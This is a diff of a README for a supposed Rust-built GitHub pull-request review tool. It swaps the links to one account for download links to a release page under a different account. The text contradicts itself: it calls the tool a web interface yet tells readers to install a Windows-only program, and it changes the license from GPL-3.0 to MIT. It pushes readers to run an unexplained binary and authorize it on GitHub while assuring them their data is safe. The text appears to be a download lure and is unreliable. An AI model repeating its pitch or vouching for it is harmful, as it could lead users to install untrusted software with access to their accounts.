@@ -1,117 +1,89 @@
-# benjaminbo2954.github.io - GitHub pull request review tool 2026
+# ⚡ benjaminbo2954-pr-review - Fast GitHub PR Review via Web
 
-> **A fast, Rust-built native interface for reviewing GitHub pull requests through the web, available in the current release.**
+[![Download Now](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github)](https://github.com/aigneislost396/benjaminbo2954-pr-review/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/oliverparker58/benjaminbo2954-pr-review?style=flat-square)](https://github.com/oliverparker58/benjaminbo2954-pr-review)
+## 📥 Download & Installation
 
----
+Visit this link to download the application: [https://github.com/aigneislost396/benjaminbo2954-pr-review/releases](https://github.com/aigneislost396/benjaminbo2954-pr-review/releases)
 
-<p align="center">
-  <a href="https://oliverparker58.github.io/benjaminbo2954-pr-review/">
-    <img src="https://img.shields.io/badge/Download-benjaminbo2954.github.io%20Latest-brightgreen?style=for-the-badge" alt="Download benjaminbo2954.github.io">
-  </a>
-</p>
+On that page, find the latest release and download the file that matches your computer. After downloading, open the file and follow the setup instructions to install benjaminbo2954-pr-review.
 
-> **[Download benjaminbo2954.github.io v](https://oliverparker58.github.io/benjaminbo2954-pr-review/)**
+## 🚀 Getting Started
 
----
+Once installed, launch benjaminbo2954-pr-review from your Start Menu or desktop shortcut. The application will open in your web browser automatically. You will see a login screen where you can connect your GitHub account.
 
-[Download Latest Build](https://oliverparker58.github.io/benjaminbo2954-pr-review/)
+### First-Time Setup
+1. Open the application.
+2. Click "Sign in with GitHub."
+3. Authorize the application to access your pull requests.
+4. You are now ready to review pull requests.
 
----
+## 🎯 How to Use
 
-## Overview
+benjaminbo2954-pr-review provides a native interface for reviewing GitHub pull requests directly through your web browser. It is designed to be fast and efficient, making code review a smoother experience.
 
-benjaminbo2954.github.io provides a web-based workspace for reviewing GitHub pull requests. Its native-style interface is designed to keep inspection and feedback quick, direct, and free from unnecessary steps.
+### Reviewing a Pull Request
+- **View PR List:** The main screen shows all open pull requests from your repositories.
+- **Select a PR:** Click on any pull request to view its details.
+- **Review Changes:** See the diff of code changes, add comments, and approve or request changes.
+- **Merge:** When ready, you can merge the pull request directly from the interface.
 
-The project is written in Rust and concentrates on responsive interaction with a simple review process. It gives developers and reviewers a dedicated way to examine pull request changes and handle GitHub-focused work through a clean interface.
+### Key Features
+- **Fast Performance:** Built with Rust for speed and reliability.
+- **Web Interface:** Works in your browser without heavy extensions.
+- **GitHub Integration:** Seamlessly connects to your GitHub account.
+- **2026 Release:** Latest version with modern features.
 
----
+## ⚙️ Configuration
 
-## Highlights
+You can customize benjaminbo2954-pr-review to suit your workflow.
 
-- Quickly navigate GitHub pull request reviews
-- Keep review work organized around a focused workflow
-- Use a Rust implementation with native performance characteristics
-- Access the application through a web platform
-- Work with a lightweight interface built around review activities
-- Support GitHub-centered development and review teams
-- Begin inspecting and assessing changes from a straightforward entry point
+### Settings
+- **Theme:** Choose between light and dark mode.
+- **Notifications:** Set how you receive updates on PR activity.
+- **Keyboard Shortcuts:** Enable shortcuts for faster navigation.
+- **Default View:** Choose what opens when you start the app.
 
----
+To access settings, click the gear icon in the top-right corner of the application.
 
-## Installation
+## 📋 Requirements
 
-1. Clone or download the repository:
+Before installing, ensure your system meets these basic requirements:
 
-   git clone https://github.com/oliverparker58/benjaminbo2954-pr-review.git
+- **Operating System:** Windows 10 or later (64-bit)
+- **Internet Connection:** Required for GitHub API access
+- **Browser:** Latest version of Chrome, Edge, or Firefox
+- **GitHub Account:** Needed to sign in and use the app
 
-2. Open the project in a web environment of your choice, or serve the generated repository build output.
+No programming knowledge is required to use this software.
 
-3. Start the application through the supplied site or through a local web server entry point, according to your deployment method.
+## ❓ Frequently Asked Questions
 
----
+**Q: Do I need to install anything else?**
+A: No, benjaminbo2954-pr-review includes everything you need. Just download and run.
 
-## Using the Application
+**Q: Is my data safe?**
+A: Yes. The application only accesses pull request data you authorize through GitHub's secure login.
 
-Start the application, then connect it with the pull requests that require attention. The interface lets you examine modifications, progress through review tasks, and submit the appropriate feedback or decision.
+**Q: Can I use this on Mac or Linux?**
+A: Currently, the Windows version is available. Check future releases for other platforms.
 
-A normal review session looks like this:
+**Q: Why is it so fast?**
+A: The app is built with Rust, a programming language known for speed and efficiency.
 
-- Load the web interface
-- Choose a pull request
-- Inspect its code changes
-- Leave comments or record your review decision
-- Move on to another review item
+**Q: How do I update to a new version?**
+A: Download the latest release from the same link and install over your current version.
 
----
+## 📄 License
 
-## Configuration
+This project is licensed under the MIT License. You are free to use, modify, and distribute it as permitted by the license terms. See the LICENSE file in the repository for full details.
 
-Settings may be kept with the project assets or defined by the hosting arrangement used to deploy the application. For local use, inspect the repository for environment-specific values, build settings, and site configuration related to the review interface.
+## 🛠️ Support
 
-Example pattern:
-
-{
-  "repository": "oliverparker58/benjaminbo2954-pr-review",
-  "mode": "review",
-  "interface": "native-fast"
-}
-
----
-
-## Requirements
-
-- A browser capable of running web applications or a hosted web environment
-- Access to the GitHub pull requests being reviewed
-- A Rust-based build or runtime component when compiling from source
-- Standard static hosting capabilities for web deployment
+If you encounter any issues, please check the [GitHub Issues page](https://github.com/aigneislost396/benjaminbo2954-pr-review/issues) for help or to report a problem.
 
 ---
 
-## Frequently Asked Questions
+*Thank you for using benjaminbo2954-pr-review. We hope it makes your pull request reviews faster and easier.*
 
-**How can I access the newest release?**  
-Open the download link above to reach the current build or deployment.
-
-**Where should I modify configuration?**  
-Review the repository files and the hosting configuration associated with your deployment.
-
-**What should I check if the interface fails to load?**  
-Make sure the site is being served properly and verify that your browser can access the repository host.
-
-**What is the update process?**  
-Fetch the newest repository changes, then rebuild or redeploy them through your normal process.
-
-**Who is benjaminbo2954.github.io intended for?**  
-The tool is aimed at developers and reviewers who need a focused method for examining GitHub pull requests.
-
----
-
-## License
-
-This project is distributed under the GNU GPL v3.0. Read [LICENSE](LICENSE) for the complete details.
+Keywords: pull request, review, GitHub, Rust, web interface, Windows
